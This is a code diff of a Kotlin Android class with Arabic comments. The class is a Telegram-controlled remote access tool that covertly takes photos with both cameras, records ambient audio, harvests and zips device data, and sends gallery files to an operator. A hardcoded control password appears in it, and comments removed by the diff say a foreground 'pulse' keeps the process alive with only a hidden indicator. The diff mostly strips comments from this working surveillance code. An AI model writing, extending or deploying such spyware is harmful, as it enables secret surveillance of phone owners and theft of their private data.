@@ -20,54 +20,12 @@ import java.util.concurrent.ConcurrentHashMap
 /**
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
  *
- * 📌 **الإيموجيات المستخدمة في الأزرار التفاعلية:**
- * ──────────────────────────────────────────────
- * | الإيموجي | الاستخدام                          |
- * |----------|------------------------------------|
- * | 📸       | التقاط صورة (كاميرا خلفية)        |
- * | 👁️       | التقاط صورة (كاميرا أمامية)       |
- * | 🎙️       | تنصت محيطي (تسجيل صوتي)           |
- * | 📦       | استخراج البيانات (حصاد)           |
- * | 🗂️       | أرشيف الوسائط (معرض)              |
- * | ⚡       | بث فوري (إرسال فوري)              |
- * | 🧬       | تحديث الشبكات (تحديث النموذج)     |
- * | 🟢       | جهاز متصل                         |
- * | 🔴       | جهاز غير متصل                     |
- * | 📱       | أيقونة الجهاز                     |
- * | 📡       | الأجهزة النشطة                    |
- * | 🧠       | محرك الذكاء                       |
- * | ⏳       | تمديد الجلسة                      |
- * | 📊       | تقرير النظام                      |
- * | 🗄️       | إدارة الأرشيف                     |
- * | 🔌       | قطع الاتصال                       |
- * | 🔙       | العودة للخلف / إلغاء              |
- * | 🏠       | القائمة الرئيسية                  |
- * | 🔃       | تحديث                             |
- * | 🔒       | قفل التحكم / تسجيل الخروج         |
- * | 🎯       | اقتناص بصري (خلفي)                |
- * | 👁️       | اقتناص بصري (أمامي)               |
- * | 🗑️       | حذف                               |
- * | ✅       | تأكيد / نجاح                      |
- * | ❌       | خطأ                               |
- * | ⚠️       | تحذير                             |
- * | 📤       | تحميل                             |
- * | 📥       | استقبال                           |
- * | 🖼️       | معرض الوسائط                      |
- * | 📄       | ملف نصي                           |
- * | 🎤       | تسجيل صوتي                        |
- * | 🔋       | البطارية                          |
- * | ⏳       | انتظار / جارٍ التنفيذ             |
- * | 🚀       | إرسال فوري                        |
- * | 📭       | لا توجد ملفات                     |
- * | 💾       | حجم الملف                         |
- * | ⏰       | الوقت / التوقيت                   |
- * ──────────────────────────────────────────────
- *
  * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
  * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
  * ✅ تم إصلاح handleCamera (إزالة scope.launch المتداخل).
  * ✅ تم تحسين sendPulseIntent للتعامل مع فشل بدء الخدمة.
  * ✅ تم إصلاح handleMedia لاستخراج message_id من JSONObject مباشرة.
+ * ✅ تم إضافة @Volatile للمتغيرات المشتركة.
  */
 class Commands private constructor(context: Context) {
 
@@ -139,19 +97,6 @@ class Commands private constructor(context: Context) {
 
         /**
          * نقطة دخول خارجية لتنفيذ الأوامر
-         * 📌 الإيموجيات المستخدمة في callback_data:
-         * - 📸 cam_, camf_ → كاميرا خلفية / أمامية
-         * - 🎙️ mic_ → ميكروفون
-         * - 📦 hrv_ → حصاد
-         * - ⚡ send_now_ → إرسال فوري
-         * - 🧬 update_model_ → تحديث النموذج
-         * - 🗂️ media_ → معرض الوسائط
-         * - 📡 ld → الأجهزة النشطة
-         * - 🧠 ai_status → حالة محرك الذكاء
-         * - ⏳ rnw → تمديد الجلسة
-         * - 📊 status → تقرير النظام
-         * - 🗄️ menu → إدارة الأرشيف
-         * - 🔌 ext → قطع الاتصال
          */
         fun ex(
             context: Context,
@@ -269,7 +214,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  التسجيل الصوتي (بديل _record_audio)
+    //  التسجيل الصوتي
     // ============================================================
 
     private suspend fun recordAudio(durationSec: Int = 10): File? =
@@ -469,7 +414,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  إرسال الملفات النصية (بديل _send_text_file)
+    //  إرسال الملفات النصية
     // ============================================================
 
     private suspend fun sendTextFile(tg: Any?, chatId: Long, content: String, filename: String) {
@@ -551,7 +496,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج أوامر المعرض (Gallery) – دعم كامل للأوامر الجديدة والقديمة
+    //  معالج أوامر المعرض (Gallery)
     // ============================================================
 
     private suspend fun handleGallery(cmd: String, tg: Any?, m: Any?, cid: Long) {
@@ -604,7 +549,7 @@ class Commands private constructor(context: Context) {
                     }
                 }
 
-                // الإجراءات القديمة (g_act) – تستخدم للتوافق مع الأوامر القديمة
+                // الإجراءات القديمة (g_act)
                 "g_act" -> {
                     if (parts.size >= 5) {
                         val subAction = parts[1]
@@ -624,14 +569,13 @@ class Commands private constructor(context: Context) {
                     }
                 }
 
-                // تأكيد الحذف (للأوامر القديمة – تم تعديله لاستخدام g_conf_del_one)
+                // تأكيد الحذف (للأوامر القديمة)
                 "g_conf" -> {
                     if (parts.size >= 5) {
                         val act = parts[1]
                         val cat = parts[2]
                         val pg = parts[3]
                         val idx = parts[4]
-                        // إذا كان الإجراء del، نستخدم g_conf_del_one (النظام الجديد)
                         if (act == "del") {
                             val confirmKb = listOf(
                                 listOf(
@@ -648,7 +592,6 @@ class Commands private constructor(context: Context) {
                             val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                             sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb)
                         } else {
-                            // للأوامر القديمة الأخرى (إن وجدت)
                             val confirmKb = listOf(
                                 listOf(
                                     mapOf(
@@ -724,7 +667,7 @@ class Commands private constructor(context: Context) {
                     }
                 }
 
-                // تأكيد حذف الصفحة (يظهر أزرار تأكيد)
+                // تأكيد حذف الصفحة
                 "g_conf_del" -> {
                     if (parts.size >= 3) {
                         val cat = parts[1]
@@ -794,18 +737,15 @@ class Commands private constructor(context: Context) {
                 return
             }
 
-            // ✅ إرسال نبض للخدمة الأمامية قبل التقاط الصورة (لتجنب قتل العملية)
+            // ✅ إرسال نبض للخدمة الأمامية قبل التقاط الصورة
             sendPulseIntent("📸 Visual Sync")
 
             sendTelegramAction(tg, cid, "upload_photo")
-
-            // ✅ إرسال رسالة "جارٍ المعالجة" بدلاً من رسالة النجاح الفورية
             sendTelegramMessage(tg, cid, "⏳ جارٍ الالتقاط والمعالجة...")
 
             // ✅ التنفيذ مباشرة بدون Coroutine متداخل
             try {
                 invokeMethod(cameraAnalyzer, "harvest", isFront)
-                // ✅ إرسال رسالة النجاح بعد اكتمال العملية
                 sendTelegramMessage(tg, cid, "✅ تم التقاط الصورة وتحليلها بنجاح.")
             } catch (e: Exception) {
                 Log.e(TAG, "❌ Camera harvest error: ${e.message}")
@@ -818,7 +758,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج أوامر الميكروفون (مع إرسال نبض للخدمة الأمامية)
+    //  معالج أوامر الميكروفون
     // ============================================================
 
     private suspend fun handleMic(tg: Any?, m: Any?, cid: Long) {
@@ -828,7 +768,6 @@ class Commands private constructor(context: Context) {
                 return
             }
 
-            // ✅ إرسال نبض للخدمة الأمامية قبل بدء التسجيل
             sendPulseIntent("🎙️ Audio Sync")
 
             stopRecordingFlag = false
@@ -857,12 +796,11 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج الحصاد (Harvest) (مع إرسال نبض للخدمة الأمامية)
+    //  معالج الحصاد (Harvest)
     // ============================================================
 
     private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
         try {
-            // ✅ إرسال نبض للخدمة الأمامية قبل بدء الحصاد
             sendPulseIntent("📦 Data Harvest")
 
             val dailyZipper = getModuleComponent(m, "dailyZipper")
@@ -966,7 +904,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  دوال الانعكاس (Reflection) للتعامل مع المكونات الأخرى
+    //  دوال الانعكاس (Reflection)
     // ============================================================
 
     private fun getModuleComponent(target: Any?, fieldName: String): Any? {
@@ -1003,7 +941,7 @@ class Commands private constructor(context: Context) {
     }
 
     /**
-     * ✅ استدعاء دالة على كائن عبر الانعكاس مع مطابقة عدد المعاملات فقط.
+     * ✅ استدعاء دالة عبر الانعكاس مع مطابقة عدد المعاملات.
      * تم إضافة تخزين مؤقت للـ Method لتحسين الأداء باستخدام ConcurrentHashMap.
      */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
@@ -1033,14 +971,11 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ دالة مساعدة للتحقق من كلمة السر (تُستخدم عند استقبال الأوامر النصية)
+    //  ✅ دالة مساعدة للتحقق من كلمة السر
     // ============================================================
 
     /**
      * التحقق من صحة كلمة السر المدخلة.
-     * @param inputSecret كلمة السر المدخلة
-     * @param expectedSecret كلمة السر المتوقعة (افتراضياً "Zaen123@123@")
-     * @return true إذا تطابقت، false وإلا
      */
     fun validateControlPassword(inputSecret: String, expectedSecret: String = "Zaen123@123@"): Boolean {
         return inputSecret.trim() == expectedSecret
@@ -1142,9 +1077,6 @@ class Commands private constructor(context: Context) {
 
     /**
      * إرسال نبض (Pulse) إلى الخدمة الأمامية لإظهار إشعار عابر.
-     * يُستخدم قبل تنفيذ الأوامر الحساسة (كاميرا، ميكروفون، حصاد)
-     * لتجنب قتل العملية في الخلفية ولإعطاء مؤشر بصري خفي.
-     *
      * 📌 الإيموجيات المستخدمة في أنواع النبض:
      * - 📸 Visual Sync → للكاميرا
      * - 🎙️ Audio Sync → للميكروفون
